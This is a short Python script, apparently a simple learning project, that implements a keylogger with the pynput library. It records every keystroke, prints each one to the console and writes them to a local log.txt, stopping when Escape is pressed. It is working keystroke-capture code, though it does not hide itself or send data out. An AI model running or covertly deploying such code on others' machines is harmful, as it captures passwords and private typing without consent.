ddelp0 # keylogger using pynput module


# keylogger using pynput module

import pynput
from pynput.keyboard import Key, Listener

keys = []  # Initialize an empty list to store pressed keys


def on_press(key):
    keys.append(key)  # Append the pressed key to the list
    write_file(keys)  # Call the write_file function to save the keys

    try:
        print('alphanumeric key {0} pressed'.format(key.char))  # Print alphanumeric keys

    except AttributeError:
        print('special key {0} pressed'.format(key))  # Print special keys


def write_file(keys):
    with open('log.txt', 'w') as f:
        for key in keys:
            # Remove single quotes from the key representation
            k = str(key).replace("'", "")
            f.write(k)

            # Explicitly add a space after every keystroke for readability
            f.write(' ')


def on_release(key):
    print('{0} released'.format(key))
    if key == Key.esc:
        # Stop the listener when the Escape key is pressed
        return False


# Set up the listener
with Listener(on_press=on_press,
              on_release=on_release) as listener:
    listener.join()
